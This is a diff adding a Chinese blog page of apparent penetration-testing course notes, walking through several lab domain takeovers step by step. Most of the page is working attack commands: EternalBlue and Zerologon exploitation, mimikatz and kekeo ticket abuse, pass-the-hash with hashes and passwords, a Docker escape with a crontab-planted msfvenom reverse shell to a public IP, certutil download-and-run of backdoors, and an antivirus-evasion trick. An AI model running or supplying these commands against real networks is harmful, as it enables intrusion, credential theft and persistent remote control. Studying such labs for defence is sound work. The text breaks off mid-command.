@@ -1,0 +1,827 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="渗透测试" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/">
+
+
+
+  <title>
+XD22 13 补充知识 - 信息安全 |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">XD22 13 补充知识
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2022-12-30 00:00:00">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-12-30T00:00:00+08:00">2022-12-30</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>22k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>37 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/PCwuTAfIR1Bnpkz.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/gs6XxBVA1FQvmG4.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/X1rsLTk5JUecDzf.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KopmzJq4geNSalr.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KW4nDo2ZJuVILkS.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BId2kKHmufXsrnl.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h3 id="vpc项目"><a class="markdownIt-Anchor" href="#vpc项目">#</a> vpc 项目</h3>
+<h4 id="vpc1"><a class="markdownIt-Anchor" href="#vpc1">#</a> vpc1</h4>
+<p><img data-src="/N1h1l157/Safe/image-003.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过 web 漏洞拿到 web 服务器的权限，用后门工具连接后，上传 cs 的马进 行上线。</span><br><span class="line"></span><br><span class="line">对 web 服务器进行域内信息收集，端口扫描，mimikatz 运行，导出部分凭 据和明文。设置代理转发端口，利用 proxychains 代理流量并用 CrackMapExec 工具进行域用户和本地用户的密码喷射，得到 windows 7 的本地用户权限，通 过端口转发上线此台机器。win7 的域用户 hash 和明文进行喷射时发现没有效果。</span><br><span class="line"></span><br><span class="line">在 windows7 上进行 spn 扫描，识别到了 mssql 服务器，利用注册表命令对 navicat 进行密码的读取并利用工具解密得到 mssql 的数据库密码。在主机上通 过 MDUT 与 proxifer 建立的规则连接到获取到密码的 mssql，开启 xpcmdshell 并 上传木马至服务器，执行成功之后获取到了 windows2008 的主机权限。</span><br><span class="line"></span><br><span class="line">对拿到的 2008 再次进行 mimikaz 导出明文，设置代理规则，用获取到的明 文依次进行域用户和本地用户登录，最终得到域控权限。</span><br></pre></td></tr></table></figure>
+<p>（ 1 ）上线 msf<br>
+ 控制 weblogic 之后，先 sleep 0 ，其次进行网卡内存活主机扫描，判断存在 445 端口开放的主机；设置 socket 转发通过 fscan 进行内网扫描，识别到 ms17_010。检测到漏洞之后，将权限转发给 msf，由 msf 进行攻击。</p>
+<p>（ 2 ）将权限从 cs 转发至 msf<br>
+cs 配置 forigen http 的监听器，并命名为 msf<br>
+ 主机移交监听器至 msf：spawn msf</p>
+<p>（ 3 ）MSF 监听联动配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport xxxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>（ 4 ）msf 添加路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p # 查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute # 添加当前路由表</span><br></pre></td></tr></table></figure>
+<p>（ 5 ）利用模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp # 正向连接上线</span><br><span class="line">set rhost 10.10.20.7 # 设置连接目标</span><br><span class="line">set rhosts 10.10.20.7 # 设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>（ 6 ）获取 win7 的权限之后需再次设置路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p # 查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute # 添加当前路由表</span><br></pre></td></tr></table></figure>
+<p>（ 7 ）将权限从 msf 转发至 cs<br>
+ 设置 windows/beacon_bind_tcp 的监听器，生成此监听器的木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将木马上传到服务器，通过msf命令将木马发送到肉机</span></span><br><span class="line">upload /root/bb.exe c:\\bb.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cs连接正向执行的木马：</span></span><br><span class="line">connect 10.10.20.7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断是否在域环境及获取域控ip</span></span><br><span class="line">net user /domain</span><br></pre></td></tr></table></figure>
+<p>（ 8 ）读取明文密码和 hash<br>
+getsystem 提升权限至 system，并运行 mimikatza 读取密码，cs 的操作为直接通过插件，msf 的操作为 load kiwi，creds_all 进行读取。</p>
+<p>（ 9 ）查找域内非约束委派用户和计算机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置代理或者上传adfind工具来进行扫描</span></span><br><span class="line">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+<p>（ 10 ）对存在约束委派的 sqlserver 攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">端口扫描识别存在约束委派的机器</span></span><br><span class="line">fscan -h 10.10.10.18</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击域内数据库主机：Proxifier设置整个网段的代理规则</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">弱口令扫描sqlserver机器：随便选去一个工具进行弱口令检测</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MDUT攻击数据库：通过账户密码连接到sqlserver服务器，上传正向木马并执行（正向木马是绑定在了肉机自己的端口上，用cs连接此ip的端口可以上线）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cs连接sqlserver：</span></span><br><span class="line">connect 10.10.10.18 2222</span><br></pre></td></tr></table></figure>
+<p>（ 11 ）提权并进行 mimikza 导出<br>
+用 10.10.20.x 的 win 7 机器进行转发上线，设置监听为 10.10.10.7，进行反向连接设置，对拿到的 mssql 的机器进行权限提升并选择监听器为 10.10.10.7 上开通的监听。以管理员权限运行 mimikza 进行明文密码和 hash 的导出。</p>
+<p>（ 12 ）通过 mssql 用户以约束委派方式攻击域控主机<br>
+建立代理或者上传 kekeo 工具进行票据操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kekeo请求获取sqlserver的TGT：</span></span><br><span class="line">kekeo &quot;tgt::ask /user:sqlserver /domain:redteam.red/passwor d:Server12345 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用票据请求域控：</span></span><br><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red @REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入内存：</span></span><br><span class="line">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~o wa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure>
+<p>（ 13 ）上线域控<br>
+连接域控： <code>dir \\OWA\\c$</code> <br>
+ 通过命令上传木马并执行上线域控，也可以用 psexec 等工具上线域控</p>
+<h4 id="vpc2"><a class="markdownIt-Anchor" href="#vpc2">#</a> vpc2</h4>
+<p><img data-src="/N1h1l157/Safe/image-004.png" alt></p>
+<p>（ 1 ）web 服务器 linux 权限获取<br>
+ web 上的 url 地址显示 login;jsessionid，抓包可以得到 remember me 的字段，<br>
+判断出是 shiro 框架，直接用 shiro 反序列化工具攻击，通过此工具植入哥斯拉 的内存马，用哥斯拉上线此台机器。</p>
+<p>对此机器进行审查，查看到有 dockerenv 的文件，从而判断出当前正处于 d ocker 内，需要进行 docker 逃逸</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">采用 https://cloud.tencent.com/developer/article/1987725 中的挂载方法进行逃逸。</span></span><br><span class="line">fdisk -l &amp; mkdir xiaodi &amp; mount /dev/vda1 xiaodi/ &amp; chroot /xiaodi/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击 linux 常用 msf，准备 msf 的 elf 木马如下，生成之后将木马通过哥斯拉 上传到 docker 容器中，在从 docker 容器挂载的目录复制到/root 目录下。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同时 msf 开启监听，等待木马执行之后的回联。</span></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPO RT=3333 -f elf &gt; shell.elf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改计划任务设置木马执行的时间</span></span><br><span class="line">chmod +x /xiaodi/root/shell.elf</span><br><span class="line">echo &#x27;*/1 * * * * root /root/shell.elf&#x27; &gt;&gt; /xiaodi/etc/crontab 等待特定时间后成功上线 linux</span><br></pre></td></tr></table></figure>
+<p>（ 2 ）windows 2012 权限获取<br>
+通过 msf 添加路由的方式自动添加路由，对 1 网段进行扫描，获取到存活主机 1.16 与 1.10，并且在 16 地址上存在 web 服务，通过 msf 设置代理规则将内网服务映射到服务器上，利用 proxychains 在外网上访问内网服务。构造 http://192.168.1.16/?num []=1 进行绕过，并且得到了主机凭据 {Administrator / Admin1234567}。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量对域用户和本地用户进行凭据测试，判断出此凭据属于 win 2012 的本地用户。</span></span><br><span class="line">proxychains python cme smb 192.168.1.10- 16 - u administrator -p &#x27;Admin1234567&#x27; --local-auth</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">win 2012 设置有防止流量出站的防火墙规则，采用正向连接的木马绕过此限制，若不知道网络情况的话需要反向正向都进行测试，命令如下。</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=5555 - f exe &gt; bd.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因win 2012 不出网，故将木马上传至linux跳板机，在跳板机上用python开启简易web服务，</span></span><br><span class="line">python -m SimpleHTTPServer。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">并利用CrackMapExec直接在win 2012 上执行下载木马并且运行的木马，同时对特定端口进行正向监听，等待shell的回连。</span></span><br><span class="line">proxychains python cme smb 192.168.1.16 -u administrator -p &#x27;Admin1234567&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.1.14:8000/bd.exe](http://192.168.1.14:8000/bd.exe) c:/bd.exe &amp; c:/bd.exe&#x27; --local-auth</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时成功获取到了win 2012 的权限。</span></span><br></pre></td></tr></table></figure>
+<p>（ 3 ）dc 权限获取</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在win 2012 进行mimikatz kiwi的攻击从而获取到登录过此主机的历史<span class="built_in">hash</span>，成功获取到一个xiaodisec用户的<span class="built_in">hash</span>值。测试此<span class="built_in">hash</span>值与dc的通信。</span></span><br><span class="line">proxychains python cme smb 192.168.1.10 -u administrator -H hash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现此<span class="built_in">hash</span>值就是dc的凭据，接下来就是利用此<span class="built_in">hash</span>进行木马下载，上传木马至dc，并突破火绒的限制，拿到dc的权限。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过msf生成hex的木马，撰写go脚本实现命令拼接式的无文件落地的免杀exe。并通过同样的方法将命令放在linux上开启的简易web上。</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=6666 - f hex</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用CrackMapExec执行普通的命令执行时都会被视为威胁无法成功，通过如下的方式绕过火绒的检测，从linux上获取到木马并执行。</span></span><br><span class="line">&quot;c&quot;&quot;e&quot;&quot;r&quot;&quot;t&quot;&quot;u&quot;&quot;t&quot;&quot;i&quot;&quot;l&quot; -&quot;u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot; -split -f [http://192.168.1.14:](http://192.168.1.14:)8000/5.exe c:/5.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载仍然是失败的，在此情况下，使用交互式方案下载木马，具体命令如下。</span></span><br><span class="line">proxychains python smbexec.py -hashes :f1065013e55bbbeb64ddab768229710d xiaodi/administrator@192.168.1.10</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以此方式打开的交互式 cmd，可以下载免杀木马并且执行成功上线。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">除了这种变异命令之外，还可以采用copy的方式，从域控上讲木马从linux上直接复制到其上，不过也是需要开启交互式的cmd进行木马的获取的。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀毒对外部的数据比较严格，对自己的数据比较宽松，可以生成票据从域控连接到域内主机，通过copy命令将exe木马从域内主机复制到域控上。</span></span><br></pre></td></tr></table></figure>
+<h4 id="vpc3"><a class="markdownIt-Anchor" href="#vpc3">#</a> vpc3</h4>
+<p><img data-src="/N1h1l157/Safe/image-005.png" alt></p>
+<p>（ 1 ）靶场 1 - Web 攻防</p>
+<p>（ 2 ）靶机 2 - MS17010 漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码喷射尝试：（失败）（由于知道是工作组，所以不需要进行域登录，参数也要改）</span></span><br><span class="line">proxychains python cme smb 192.168.2.128- 129 - u administrator -H 53bd9892cea6f1d9ffa8ac587ba3cba6 --local-auth</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MS17010-MSF判断和利用</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=47.94.236.117 LPORT=999 -f exe &gt; m.exe</span><br></pre></td></tr></table></figure>
+<p>检测：auxiliary/scanner/smb/smb_ms17_010<br>
+ 利用：exploit/windows/smb/ms17_010_eternalblue</p>
+<p>（ 3 ）靶机 3 - 口令获取<br>
+密码喷射尝试：（成功）<br>
+直接 CS 插件移动获取成功</p>
+<p>（ 4 ）靶机 4 - 通过 weblogic 获取<br>
+密码喷射尝试：（失败）<br>
+探针端口 7001 开放 - Weblogic - 利用漏洞攻击 - 工具利用<br>
+上传 webshell-C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_internal\9j4dqk\war\xiaodi.jsp<br>
+ 上传后门（反向）- 防火墙开启（扫描的时候发现被阻止）<br>
+执行后门上线 CS</p>
+<p>（ 5 ）靶机 5<br>
+ 利用靶机 4 的口令横向移动得到</p>
+<p>（ 6 ）靶机 6<br>
+CVE-2017-0146 不存在、CVE-2014-6324 太老、CVE-2021-42287 、CVE- 2022-26923 条件不满足。CVE-2020-1472 满足。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接DC清空凭证</span></span><br><span class="line">proxychains python cve-2020-1472-exploit.py dc 192.168.10.10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取域内HASH</span></span><br><span class="line">cd impacket-0.9.23/examples/</span><br><span class="line">proxychains python secretsdump.py dc\$@192.168.10.10 -just-dc -no-pass</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接域控PTH</span></span><br><span class="line">proxychains python wmiexec.py -hashes :a402bea39d0f49b50ea1941120780ee3 xdorg/administrator@192.168.10.10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传后门至域内主机上&amp;CS横向移动</span></span><br><span class="line">copy \\web\c$\6677.exe</span><br><span class="line">6677.exe</span><br><span class="line">connect 192.168.10.10 6677</span><br></pre></td></tr></table></figure>
+<h4 id="vpc4"><a class="markdownIt-Anchor" href="#vpc4">#</a> vpc4</h4>
+<p><img data-src="/N1h1l157/Safe/image-006.png" alt></p>
+<p>（ 1 ）靶机 1 ：WEB<br>
+tomcat 弱口令上传制作的 war 连接哥斯拉、上传 cs 后门执行上线，getsystem 进入域、探针内网 IP 段，定位域控，信息打点服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提高权限</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取前缀</span></span><br><span class="line">net view /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定位域控</span></span><br><span class="line">net time /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">netbios前缀 jishu</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域控 jishudc.jishu.xiaodi.vpc 192.168.2.20</span></span><br></pre></td></tr></table></figure>
+<p>（ 2 ）靶机 2 ：SQL<br>
+ 口令喷射失败<br>
+ spn 扫描服务<br>
+数据库配置文件翻阅，弱口令爆破（MSSQL）<br>
+MDUT 代理转发 正向上线 主动连接上线</p>
+<p>（ 3 ）靶机 3 ：jishudc<br>
+psexec CrackMapExec 口令喷射成功，横向拿下</p>
+<p>（ 4 ）靶机 4 ：xds<br>
+ 利用域管口令横向拿下<br>
+获取前缀：net view /domain<br>
+ 获取到其他子域 xiaoshou<br>
+xiaoshou.xiaodi.vpc</p>
+<p>（ 5 ）靶机 5 ：xsd<br>
+ 口令喷射不成功，有防火墙<br>
+ 80 端口拿下 - 通达 OA 漏洞利用 - Getshell<br>
+ 上传正向木马执行并主动连击<br>
+获取域控 netbios 及域控 ip 地址</p>
+<p>（ 6 ）靶机 6 ：xiaoshoudc<br>
+hash 匹配不上，采用漏洞提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">14、17 年的漏洞太老不选择，21、22 需要 一个域内的明文账户密码，前提条件不满足，选择 20 年的漏洞。</span></span><br><span class="line">proxychains python cve- 2020 - 1472 - exploit.py xiaoshoudc 192.168.3.20 shell noPac.exe -domain xiaoshou.xiaodi.vpc -user xiaosedi -pass xsd!@#45 /dc xiaoshoudc.xiaoshou.xiaodi.vpc /mAccount test /mPassword 12qwAS.. /service cifs /ptt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用<span class="built_in">hash</span>及psexec进行利用拿权限：flag.txt口令传递拿下、</span></span><br><span class="line">shell copy hack.php \\xiaoshoudc\c$\phpstudy_pro\www\hack.php</span><br></pre></td></tr></table></figure>
+<p>（ 7 ）靶场 7 ：file 也可以采用 Nopac 提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">横向口令拿下</span></span><br><span class="line">proxychains python cme smb 192.168.4.11 -u administrator -H f1065013e55bbbeb64ddab768229710d --local-auth</span><br></pre></td></tr></table></figure>
+<p>（ 8 ）靶场 8 ：fileadmin<br>
+ 资源约束委派</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取受害目标：有哪些域内计算机存在同一用户加入的</span></span><br><span class="line">shell AdFind.exe -h 192.168.4.20 -b &quot;DC=xiaodi,DC=vpc&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断受害用户：</span></span><br><span class="line">shell sid2user.exe \\192.168.4.20 5 21 3673262946 1983004332 2925526849 1103</span><br><span class="line">shell SharpAllowedToAct.exe -m xxxyyxxx -p xxyyx!@#45 -t file -a 192.168.4.20 xiaodi.vpc</span><br><span class="line">python getST.py -dc-ip 192.168.4.20 